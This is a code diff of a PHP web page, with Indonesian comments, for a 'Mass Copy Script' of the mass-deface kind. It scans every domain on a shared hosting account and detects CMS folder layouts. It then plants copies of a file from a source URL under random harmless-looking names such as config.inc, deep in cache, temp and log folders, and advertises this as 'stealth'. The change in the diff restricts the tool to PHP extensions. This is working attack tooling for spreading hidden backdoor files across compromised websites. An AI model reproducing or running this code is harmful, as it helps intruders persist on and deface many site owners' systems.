@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Mass Copy Script - Advanced Stealth</title>
+    <title>Mass Copy Script - PHP Only</title>
     <META NAME="robots" CONTENT="noindex,nofollow">
     <style>
         body { font-family: Arial, sans-serif; background: #f4f4f4; }
@@ -26,35 +26,21 @@
 </head>
 <body>
 <div class="container">
-    <center><h1>Advanced Mass Copy Script</h1>
-    <span class="badge">Stealth Mode v2.0</span></center>
+    <center><h1>Mass Copy Script</h1>
+    <span class="badge">PHP Only</span></center>
     
     <?php
     // ============ FUNGSI UTAMA ============
     
-    // Generate nama file random sesuai format yang dipilih
-    function generateRandomFilename($format = 'php', $depth = 0) {
+    // Generate nama file PHP random
+    function generateRandomFilename($depth = 0) {
         $prefixes = ['backup', 'temp', 'cache', 'data', 'config', 'system', 'core', 'lib', 'module', 'plugin', 
                      'include', 'component', 'widget', 'block', 'element', 'helper', 'handler', 'processor',
                      'index', 'default', 'main', 'app', 'bootstrap', 'autoload', 'function', 'class'];
         
-        // Format extensions yang valid
-        $extensions = [
-            'php' => ['php', 'inc', 'class', 'func', 'module'],
-            'html' => ['html', 'htm', 'shtml'],
-            'js' => ['js', 'min.js'],
-            'css' => ['css', 'min.css'],
-            'txt' => ['txt', 'log', 'md'],
-            'asp' => ['asp', 'aspx'],
-            'jsp' => ['jsp', 'jspx'],
-            'py' => ['py', 'pyc'],
-            'rb' => ['rb', 'rbw'],
-            'pl' => ['pl', 'cgi']
-        ];
-        
-        // Pilih extension sesuai format
-        $extList = isset($extensions[$format]) ? $extensions[$format] : $extensions['php'];
-        $suffix = $extList[array_rand($extList)];
+        // Extension PHP saja
+        $extensions = ['php', 'inc', 'class', 'func'];
+        $suffix = $extensions[array_rand($extensions)];
         
         // Semakin dalam folder, semakin umum nama filenya
         if ($depth > 2) {
@@ -80,7 +66,7 @@
         return $folders[array_rand($folders)];
     }
 
-    // SCAN ALL DOMAINS - Improved version
+    // SCAN ALL DOMAINS
     function scanAllDomains($homePath) {
         $domains = [];
         $domainPath = rtrim($homePath, '/') . '/domains/';
@@ -165,8 +151,7 @@
             'zend' => ['module', 'vendor', 'public'],
             'magento' => ['app', 'skin', 'media', 'var'],
             'prestashop' => ['classes', 'controllers', 'modules', 'themes'],
-            'opencart' => ['catalog', 'admin', 'system', 'extension'],
-            'custom' => ['admin', 'includes', 'classes', 'functions']
+            'opencart' => ['catalog', 'admin', 'system', 'extension']
         ];
         
         $detected = [];
@@ -261,7 +246,6 @@
         $baseDir = $_POST['massdefacedir'];
         $maxDepth = isset($_POST['maxdepth']) ? intval($_POST['maxdepth']) : 4;
         $copyCount = isset($_POST['copycount']) ? intval($_POST['copycount']) : 2;
-        $fileFormat = isset($_POST['fileformat']) ? $_POST['fileformat'] : 'php';
         $scanAll = isset($_POST['scanall']) ? true : false;
         
         $log = [];
@@ -288,9 +272,9 @@
         $homePath = "/home/" . $currentUser . "/";
         
         echo "<div class='log'>";
-        echo "<strong>🚀 Starting Advanced Stealth Copy v2.0...</strong><br>";
+        echo "<strong>🚀 Starting PHP Mass Copy...</strong><br>";
         echo "Source URL: " . htmlspecialchars($sourceUrl) . "<br>";
-        echo "File Format: <strong>" . strtoupper($fileFormat) . "</strong> | Depth: " . $maxDepth . " | Copies: " . $copyCount . "<br><br>";
+        echo "File Format: <strong>PHP</strong> | Depth: " . $maxDepth . " | Copies: " . $copyCount . "<br><br>";
         
         // SCAN ALL DOMAINS
         $allDomains = scanAllDomains($homePath);
@@ -366,8 +350,8 @@
                         }
                     }
                     
-                    // Generate filename sesuai format
-                    $randomFile = generateRandomFilename($fileFormat, $depth + $i);
+                    // Generate filename PHP
+                    $randomFile = generateRandomFilename($depth + $i);
                     $newFile = $nestedPath . '/' . $randomFile;
                     
                     // Cek duplikat
@@ -398,7 +382,7 @@
         echo "<strong>📋 Complete Summary:</strong><br>";
         echo "Total Domains Processed: " . count($processedDomains) . "<br>";
         echo "Total Files Created: <span class='success'>" . $successCount . "</span> | Failed: <span class='error'>" . $failCount . "</span><br>";
-        echo "File Format: <strong>" . strtoupper($fileFormat) . "</strong><br><br>";
+        echo "File Format: <strong>PHP</strong> (extensions: .php, .inc, .class, .func)<br><br>";
         
         echo "<strong>📂 Domains Processed:</strong><br>";
         foreach ($processedDomains as $d) {
@@ -428,16 +412,10 @@
             <tr>
                 <td><strong>File Format:</strong></td>
                 <td>
-                    <select name='fileformat' style='width: 100%'>
-                        <option value='php'>PHP (.php, .inc, .class)</option>
-                        <option value='html'>HTML (.html, .htm)</option>
-                        <option value='js'>JavaScript (.js)</option>
-                        <option value='css'>CSS (.css)</option>
-                        <option value='txt'>Text (.txt, .log)</option>
-                        <option value='asp'>ASP (.asp, .aspx)</option>
-                        <option value='jsp'>JSP (.jsp)</option>
-                        <option value='py'>Python (.py)</option>
+                    <select name='fileformat' style='width: 100%' disabled>
+                        <option value='php' selected>PHP Only (.php, .inc, .class, .func)</option>
                     </select>
+                    <small style="color: #666;">PHP format only</small>
                 </td>
             </tr>
             <tr>
@@ -456,7 +434,7 @@
             </tr>
             <tr>
                 <td colspan="2" align="center">
-                    <input type='submit' name='execmassdeface' value='🚀 Execute Stealth Copy'>
+                    <input type='submit' name='execmassdeface' value='🚀 Execute PHP Copy'>
                 </td>
             </tr>
         </table>
@@ -464,15 +442,13 @@
     
     <div style="margin-top: 20px; padding: 10px; background: #f0f0f0; border-radius: 4px;">
         <small>
-            <strong>🔒 New Features v2.0:</strong><br>
-            • <strong>File Format Selection</strong> - Pilih format output (PHP, HTML, JS, CSS, dll)<br>
+            <strong>🔒 PHP Only Features:</strong><br>
+            • <strong>PHP Format Only</strong> - .php, .inc, .class, .func extensions<br>
             • <strong>Scan All Domains</strong> - Deteksi SEMUA domain (70+ domains)<br>
             • <strong>Better Domain Detection</strong> - Mencari public_html di semua struktur<br>
-            • <strong>Multiple Extensions</strong> - Setiap format punya multiple extension<br>
             • <strong>Priority Folders</strong> - Prioritaskan cache, temp, logs, sessions<br>
-            • <strong>Limit per Domain</strong> - Maksimal 10 lokasi per domain untuk efisiensi<br>
-            • <strong>Complete Log</strong> - Menampilkan semua domain yang diproses<br>
-            • <strong>Format Custom</strong> - Nama file menyesuaikan dengan format yang dipilih
+            • <strong>Stealth Locations</strong> - Deep nesting di folder tersembunyi<br>
+            • <strong>Complete Log</strong> - Menampilkan semua domain dan file yang dibuat
         </small>
     </div>
 </div>
